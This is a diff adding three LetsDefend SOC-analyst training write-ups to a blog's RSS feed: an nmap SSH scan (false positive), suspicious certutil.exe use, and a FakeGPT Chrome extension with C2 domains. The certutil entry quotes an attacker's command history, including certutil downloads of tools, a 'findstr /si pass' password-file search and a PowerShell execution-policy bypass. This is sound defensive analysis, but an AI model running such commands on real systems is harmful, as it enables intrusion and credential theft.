@@ -327,4 +327,194 @@ pennYDr0pper.!
 &lt;/p>
 &lt;/details>
 &lt;p>&lt;strong>Hurray!&lt;/strong>&lt;/p>
+&lt;p>&lt;a href="https://matteogreek.github.io/" target="_blank" rel="noopener">Heartstone back home&lt;/a>&lt;/p></description></item><item><title>SOC147 - SSH Scan Activity</title><link>https://matteogreek.github.io/writeups/letsdefend/soc147/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://matteogreek.github.io/writeups/letsdefend/soc147/</guid><description>&lt;h1 id="alert">Alert&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">EventID : 94
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Event Time : Jun, 13, 2021, 04:23 PM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rule : SOC147 - SSH Scan Activity
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Level : Security Analyst
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Source Address : 172.16.20.5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Source Hostname : PentestMachine
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">File Name : nmap
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">File Hash : 3361bf0051cc657ba90b46be53fe5b36
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">File Size : 2.82 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Device Action : Allowed
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Download (Password:infected) : https://files-ld.s3.us-east-2.amazonaws.com/3361bf0051cc657ba90b46be53fe5b36.zip
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="analysis">Analysis&lt;/h1>
+&lt;p>Hostname: PentestMachine
+IP Address: 172.16.20.5&lt;/p>
+&lt;ul>
+&lt;li>Terminal history: 13.06.2021 16:23 nmap -sV -sP 172.16.20.0/24&lt;/li>
+&lt;li>log management:
+&lt;ul>
+&lt;li>Date: Jun, 13, 2021, 04:23 PM&lt;/li>
+&lt;li>Src_IP 172.16.20.5&lt;/li>
+&lt;li>Src_port 53222&lt;/li>
+&lt;li>dest_IP 172.16.20.2&lt;/li>
+&lt;li>dest_port 22&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>Email: &amp;ldquo;Hi all, I will scan the LetsDefend network after 12:00 13.06.2021 This scanning could be continue all day. Please ignore SIEM alerts for &amp;ldquo;PentestMachine&amp;rdquo; hostname Hostname: PentestMachine IP Address: 172.16.20.5 Regars, Ellie&amp;rdquo;&lt;/p>
+&lt;p>The email from the penetration testing team indicated their intention to conduct a network scan after 12 PM. By examining the terminal history of the Pentest machine, we can observe the use of the nmap command to scan a range of IP addresses.&lt;/p>
+&lt;h1 id="conclusion">Conclusion&lt;/h1>
+&lt;p>The alert is a false positive.&lt;/p>
+&lt;p>&lt;a href="https://matteogreek.github.io/" target="_blank" rel="noopener">Heartstone back home&lt;/a>&lt;/p></description></item><item><title>SOC163 - Suspicious Certutil.exe Usage</title><link>https://matteogreek.github.io/writeups/letsdefend/soc163/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://matteogreek.github.io/writeups/letsdefend/soc163/</guid><description>&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>In this alert we investigate a suspicious usage of a Windows binary called &lt;strong>certutil.exe&lt;/strong>. The main focus of this exercise was to learn about LolBins (Living-off-the-land binaries).&lt;/p>
+&lt;blockquote>
+&lt;p>A Living-off-the-land binaries is any binary supplied by the operating system that is normally used for legitimate purposes but can also be abused by malicious actors. Several default system binaries have unexpected side effects, which may allow attackers to hide their activities post-exploitation.&lt;/p>
+&lt;/blockquote>
+&lt;h1 id="alert">Alert&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">EventID : 113
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Event Time : Mar, 01, 2022, 11:06 AM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rule : SOC163 - Suspicious Certutil.exe Usage
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Level : Security Analyst
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hostname : EricProd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">IP Address : 172.16.17.22
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Related Binary : certutil.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Binary Path : C:/Windows/System32/certutil.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Command Line : certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Alert Trigger Reason : -f parameter with certutil.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EDR Action : Allowed
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="detection">Detection&lt;/h1>
+&lt;p>We can look at the terminal history of the host EricProd which caused the alarm. to be created in “Endpoint Security”. As you can see in the table below “nmap” and the “windows-exploit-suggester” were downloaded.&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>EVENT&lt;/th>
+&lt;th>COMMAND LINE&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>whoami&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>net user&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>net user&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>ipconfig&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>ipconfig /all&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>net Localgroup&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>net start&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>netstat&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>tasklist&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>systeminfo&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>nmap -sV 192.168.0.0/24 -p 80&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>python3 check.py&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>arp -a&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>findstr /si pass *.txt | *.xml | *.ini&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>01.03.2021&lt;/td>
+&lt;td>&lt;code>C:/powershell.exe -nop -exec bypass&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="analysis">Analysis&lt;/h1>
+&lt;p>By searching was certutil does we discovered that it is considered a legal binary offered by Windows OS. The user run certutil to download a version of nmap and later on he started performing a scan of the internal network. The scan was performed on the subnet: 192.168.0.0/24 looking at services running specifically on port 80.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ nmap -sV 192.168.0.0/24 -p 80
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="conclusion">Conclusion&lt;/h1>
+&lt;p>The alert was a true positive. The purpose of suspicious activities performed with legal binaries for this incident was to download the tool called nmap. No malware was detected on the machine so we can assume it has been the user of the system who run the terminal commands.&lt;/p>
+&lt;p>&lt;a href="https://matteogreek.github.io/" target="_blank" rel="noopener">Heartstone back home&lt;/a>&lt;/p></description></item><item><title>SOC202 - FakeGPT Malicious Chrome Extension</title><link>https://matteogreek.github.io/writeups/letsdefend/soc202/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://matteogreek.github.io/writeups/letsdefend/soc202/</guid><description>&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>This exercise is about a suspicious Chrome extension named &amp;ldquo;ChatGPT for Google. The alert was triggered due to the suspicious addition of the extension to the browser, indicating a potential security threat. The add-on, disguising as a ChatGPT tool, targeted users&amp;rsquo; Facebook profiles. Despite its removal from the Chrome Web Store, many had already installed it, posing concerns about data privacy. Subsequent checks of network activity showed links to harmful websites related to the extension&amp;rsquo;s C2 framework. These links, combined with data from threat intelligence sources, verified the extension&amp;rsquo;s malevolent intent and the significant danger it presented to users.&lt;/p>
+&lt;h1 id="alert">Alert&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Severity: High
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Type: Data Leakage
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EventID : 153
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Event Time : May, 29, 2023, 01:01 PM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rule : SOC202 - FakeGPT Malicious Chrome Extension
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Level : Security Analyst
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hostname : Samuel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">IP Address : 172.16.17.173
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">File Name : hacfaophiklaeolhnmckojjjjbnappen.crx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">File Path : C:\Users\LetsDefend\Download\hacfaophiklaeolhnmckojjjjbnappen.crx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">File Hash : 7421f9abe5e618a0d517861f4709df53292a5f137053a227bfb4eb8e152a4669
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Command Line : chrome.exe --single-argument C:\Users\LetsDefend\Download\hacfaophiklaeolhnmckojjjjbnappen.crx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Trigger Reason : Suspicious extension added to the browser.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Device Action : Allowed
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the alert details given, a dubious file has been identified on a system labeled &amp;ldquo;Samuel&amp;rdquo; having an IP address of 172.16.17.173. This alert was activated by the SOC202 rule pertaining to the FakeGPT Malicious Chrome Extension. From the provided data, it seems the command line is trying to access or modify a Chrome extension file (having a .crx extension) via the Google Chrome browser. The device&amp;rsquo;s response is labeled as &amp;ldquo;allowed&amp;rdquo;, suggesting that the device didn&amp;rsquo;t intervene or halt the file&amp;rsquo;s execution.&lt;/p>
+&lt;p>The file name of the extension added to the browser is: &lt;strong>hacfaophiklaeolhnmckojjjjbnappen.crx&lt;/strong>
+The file hash is: &lt;strong>7421f9abe5e618a0d517861f4709df53292a5f137053a227bfb4eb8e152a4669&lt;/strong>&lt;/p>
+&lt;h1 id="analysis">Analysis&lt;/h1>
+&lt;p>In the following segment, we&amp;rsquo;ll delve into a comprehensive examination of the flagged malicious extension, utilizing external tools and methods. Moreover, we are going to try to identify the Command and Control (C2) address associated with the malware.&lt;/p>
+&lt;h2 id="extension-analysis">Extension Analysis&lt;/h2>
+&lt;ul>
+&lt;li>Virustotal: No security vendors and no sandboxes flagged this file as malicious&lt;/li>
+&lt;li>MalwareBazaar: No results&lt;/li>
+&lt;li>ChromeStats: &lt;a href="https://chrome-stats.com/d/hacfaophiklaeolhnmckojjjjbnappen" target="_blank" rel="noopener">https://chrome-stats.com/d/hacfaophiklaeolhnmckojjjjbnappen&lt;/a>
+Using ChromeStats we can find some interesting information. The extension is flagged as malicious and was removed from the Web Store. This is could be a sign that the extension is actually malicious and the alert is a true positive one.&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img src="https://github.com/matteogreek/matteogreek.github.io/assets/70201797/69054b95-0c81-4312-a4e8-e2c091e66c53" alt="Pasted image 20230819163706" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>By looking at the Browse History of the affected Host &amp;ldquo;Samuel&amp;rdquo; using the EDR, we can see that he visited the URL: &lt;a href="https://chrome.google.com/webstore/detail/chatgpt-for-google/hacfaophiklaeolhnmckojjjjbnappen" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/chatgpt-for-google/hacfaophiklaeolhnmckojjjjbnappen&lt;/a> at 2023-05-29 13:01:44. Visiting the URL, resulted in a 404 error message. This finding seems to agree with the previous clue obtained with ChromeStats.&lt;/p>
+&lt;h2 id="command-and-control-c2-identification">Command and Control (C2) Identification&lt;/h2>
+&lt;p>In this section, we will search for signs of Command and Control (C2) access. Let&amp;rsquo;s start by analyzing the network-related logs gathered from the &amp;ldquo;Samuel&amp;rdquo; Host.&lt;/p>
+&lt;p>On the Log Management tab we can filter by Samuel&amp;rsquo;s IP address 172.16.17.173.
+Here we find that the source IP made:&lt;/p>
+&lt;ul>
+&lt;li>a request to the IP 52.76.101.124 on port 80 on May, 29, 2023, 01:02 PM. By analyzing the raw log entry we can see that the Hostname linked to the destination IP is www.chatgptforgoogle.pro.&lt;/li>
+&lt;li>Another request was made to IP 172.217.17.142 on port 80 on May, 29, 2023, 01:03 PM (1 min after the previous one). By analyzing the raw log entry we can see that the Hostname linked to the destination IP is chrome.google.com&lt;/li>
+&lt;li>Another request was made to IP 18.140.6.45 on port 80 on May, 29, 2023, 01:03 PM (1 min after the previous one). By analyzing the raw log entry we can see that the Hostname linked to the destination IP is www.chatgptgoogle.org&lt;/li>
+&lt;li>A DNS Query was made:
+&lt;ul>
+&lt;li>QueryResult: ::ffff:104.21.63.166;::ffff:172.67.147.243;&lt;/li>
+&lt;li>QueryName: version.chatgpt4google.workers.dev&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>Further investigation of the domain &lt;a href="https://www.chatgptforgoogle.pro" target="_blank" rel="noopener">www.chatgptforgoogle.pro&lt;/a> on threat intelligence platforms, such as VirusTotal, confirms its malicious nature.&lt;/p>
+&lt;h1 id="conclusion">Conclusion&lt;/h1>
+&lt;p>The alert was a true positive and the findings confirm that the Chrome extension is malicious.
+Furthermore the Host accessed the malicious C2 address and so it was isolated from the network.&lt;/p>
 &lt;p>&lt;a href="https://matteogreek.github.io/" target="_blank" rel="noopener">Heartstone back home&lt;/a>&lt;/p></description></item></channel></rss>
